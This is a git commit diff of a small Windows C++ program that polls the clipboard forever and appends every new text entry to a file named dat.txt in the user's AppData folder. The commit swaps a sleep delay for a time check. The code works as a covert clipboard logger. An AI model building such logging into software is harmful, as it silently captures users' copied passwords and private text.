31ed60f27098d087686b8d6fa91143853159cdcb
stasan320 <44366841+stasan320@users.noreply.github.com>
2020-10-12 23:33:12 +0300

    Update ClipBoard_Text.cpp

--- log/ClipBoard_Text.cpp
+++ log/ClipBoard_Text.cpp
@@ -2,11 +2,8 @@
 
 #include <iostream>
 #include <fstream>
-#include <algorithm>
 #include <Windows.h>
-#include <shlobj_core.h>
-#include <stdlib.h>
-#include <stdio.h>
+#include <time.h>
 
 int main() {
 	//setlocale(LC_ALL, "RUS");
@@ -14,26 +11,32 @@ int main() {
 	//char* ClipboardText[2];
 	char last[2] = { 0, 0 };
 	std::string AppDataPath = getenv("APPDATA");
+	int ClipboardTime = NULL;
 
 	for (;;) {
-		Sleep(500);
-		if (IsClipboardFormatAvailable(CF_TEXT) == true) {
-			OpenClipboard(0);
-			HANDLE hData = GetClipboardData(CF_TEXT);
-			ClipboardText[1] = static_cast<char*>(GlobalLock(hData));
-			//GlobalUnlock(hData);
 
-			if (ClipboardText[0] != ClipboardText[1]) {
-				ClipboardText[0] = ClipboardText[1];
-				std::cout << ClipboardText[1] << std::endl;
-				std::fstream LogFile;
-				LogFile.open(AppDataPath + "\\dat.txt", std::fstream::app);
-				if (LogFile.is_open()) {
-					LogFile << ClipboardText[1] << std::endl;
-					LogFile.close();
+		//Sleep(500);
+		//std::cout << time(NULL) << std::endl;
+		if (ClipboardTime < time(NULL)) {
+			if (IsClipboardFormatAvailable(CF_TEXT) == true) {
+				OpenClipboard(0);
+				HANDLE hData = GetClipboardData(CF_TEXT);
+				ClipboardText[1] = static_cast<char*>(GlobalLock(hData));
+				//GlobalUnlock(hData);
+
+				if (ClipboardText[0] != ClipboardText[1]) {
+					ClipboardText[0] = ClipboardText[1];
+					std::cout << ClipboardText[1] << std::endl;
+					std::fstream LogFile;
+					LogFile.open(AppDataPath + "\\dat.txt", std::fstream::app);
+					if (LogFile.is_open()) {
+						LogFile << ClipboardText[1] << std::endl;
+						LogFile.close();
+					}
 				}
+				CloseClipboard();
 			}
-			CloseClipboard();
+			ClipboardTime = time(NULL);
 		}
 	}
 	return 0;
